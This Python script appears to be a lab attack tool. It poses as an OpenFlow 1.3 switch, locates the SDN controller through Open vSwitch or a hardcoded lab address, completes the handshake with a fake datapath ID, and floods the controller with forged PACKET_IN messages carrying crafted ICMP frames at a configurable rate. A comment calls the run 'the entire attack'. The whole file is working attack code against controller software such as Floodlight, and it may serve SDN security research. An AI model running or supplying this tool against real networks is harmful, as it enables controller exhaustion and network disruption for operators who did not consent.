#!/usr/bin/env python3

import argparse
import socket
import struct
import subprocess
import time
import re

from scapy.all import Ether, IP, ICMP, raw


OF_VERSION = 0x04          # OpenFlow 1.3
OFPT_HELLO = 0
OFPT_ECHO_REQUEST = 2
OFPT_ECHO_REPLY = 3
OFPT_FEATURES_REQUEST = 5
OFPT_FEATURES_REPLY = 6
OFPT_GET_CONFIG_REQUEST = 7
OFPT_GET_CONFIG_REPLY = 8
OFPT_PACKET_IN = 10


def of_header(msg_type, length, xid=1):
    return struct.pack(
        "!BBHI",
        OF_VERSION,
        msg_type,
        length,
        xid
    )


def detect_controller(switch="s1"):
    """
    Detect controller from OVS configuration.
    Expected result:
        tcp:10.0.2.15:6653
    """

    try:
        output = subprocess.check_output(
            ["ovs-vsctl", "get-controller", switch],
            text=True
        ).strip()

        output = output.replace('"', '')

        match = re.search(
            r"tcp:(\d+\.\d+\.\d+\.\d+):(\d+)",
            output
        )

        if match:
            return match.group(1), int(match.group(2))

    except Exception:
        pass

    # Lab fallback
    return "10.0.2.15", 6653


def send_hello(sock):
    sock.sendall(
        of_header(OFPT_HELLO, 8, 1)
    )


def send_features_reply(sock, xid):
    """
    Minimal OpenFlow 1.3 FEATURES_REPLY.
    """

    datapath_id = 0x00000000DEADBEEF

    body = struct.pack(
        "!QIBB2xII",
        datapath_id,
        256,        # n_buffers
        254,        # n_tables
        0,          # auxiliary_id
        0x0000004F, # capabilities
        0
    )

    sock.sendall(
        of_header(
            OFPT_FEATURES_REPLY,
            8 + len(body),
            xid
        ) + body
    )


def send_config_reply(sock, xid):
    body = struct.pack(
        "!HH",
        0,       # flags
        0xffff   # miss_send_len
    )

    sock.sendall(
        of_header(
            OFPT_GET_CONFIG_REPLY,
            12,
            xid
        ) + body
    )


def handle_controller(sock, duration=1.0):
    """
    Respond to basic Floodlight handshake messages.
    """

    sock.settimeout(0.2)

    end = time.time() + duration

    while time.time() < end:

        try:
            header = sock.recv(8)

            if len(header) < 8:
                continue

            version, msg_type, length, xid = struct.unpack(
                "!BBHI",
                header
            )

            remaining = length - 8

            if remaining:
                sock.recv(remaining)

            if msg_type == OFPT_FEATURES_REQUEST:
                send_features_reply(sock, xid)

            elif msg_type == OFPT_GET_CONFIG_REQUEST:
                send_config_reply(sock, xid)

            elif msg_type == OFPT_ECHO_REQUEST:
                sock.sendall(
                    of_header(
                        OFPT_ECHO_REPLY,
                        8,
                        xid
                    )
                )

        except socket.timeout:
            continue


def build_packet_in(xid, in_port=1):
    """
    Build an OpenFlow 1.3 OFPT_PACKET_IN message.
    """

    # Ethernet/IP/ICMP packet carried by PacketIn
    frame = raw(
        Ether(
            src="00:00:00:00:00:01",
            dst="00:00:00:00:00:02"
        )
        /
        IP(
            src="10.0.0.1",
            dst="10.0.0.4"
        )
        /
        ICMP()
    )

    # OXM_OF_IN_PORT
    oxm = struct.pack(
        "!HBBI",
        0x8000,     # OpenFlow basic class
        0x00,       # IN_PORT field
        4,          # value length
        in_port
    )

    # ofp_match:
    # type = OFPMT_OXM (1)
    # length = 4 + OXM
    match_length = 4 + len(oxm)

    match = struct.pack(
        "!HH",
        1,
        match_length
    ) + oxm

    # Pad match to multiple of 8 bytes
    padding = (8 - (len(match) % 8)) % 8
    match += b"\x00" * padding

    body = struct.pack(
        "!IHBBQ",
        0xffffffff,     # OFP_NO_BUFFER
        len(frame),
        0,              # OFPR_NO_MATCH
        0,              # table_id
        0               # cookie
    )

    body += match
    body += b"\x00\x00"
    body += frame

    return (
        of_header(
            OFPT_PACKET_IN,
            8 + len(body),
            xid
        )
        + body
    )


def main():

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--switch",
        default="s1",
        help="OVS switch used to detect controller"
    )

    parser.add_argument(
        "--source-port",
        type=int,
        default=40000,
        help="Fixed TCP source port"
    )

    parser.add_argument(
        "--count",
        type=int,
        default=500,
        help="Number of PacketIn messages"
    )

    parser.add_argument(
        "--rate",
        type=float,
        default=100,
        help="PacketIn messages per second"
    )

    args = parser.parse_args()

    controller_ip, controller_port = detect_controller(
        args.switch
    )

    print(
        f"[+] Controller detected: "
        f"{controller_ip}:{controller_port}"
    )

    print(
        f"[+] Fixed source port: "
        f"{args.source_port}"
    )

    sock = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM
    )

    # Consistent source port for the entire attack
    sock.bind(
        ("0.0.0.0", args.source_port)
    )

    print("[+] Connecting to controller...")

    sock.connect(
        (controller_ip, controller_port)
    )

    print("[+] TCP connection established")

    # Start OpenFlow handshake
    send_hello(sock)

    handle_controller(sock, 2.0)

    print("[+] Starting PacketIn test")

    interval = 1.0 / args.rate

    start = time.time()

    for i in range(args.count):

        packet = build_packet_in(
            xid=1000 + i
        )

        sock.sendall(packet)

        if (i + 1) % 100 == 0:
            print(
                f"[+] Sent {i + 1} PacketIn messages"
            )

        time.sleep(interval)

    elapsed = time.time() - start

    print()
    print(
        f"[+] Completed: {args.count} PacketIn"
    )

    print(
        f"[+] Time: {elapsed:.2f} seconds"
    )

    print(
        f"[+] Average rate: "
        f"{args.count / elapsed:.1f} msg/s"
    )

    sock.close()


if __name__ == "__main__":
    main()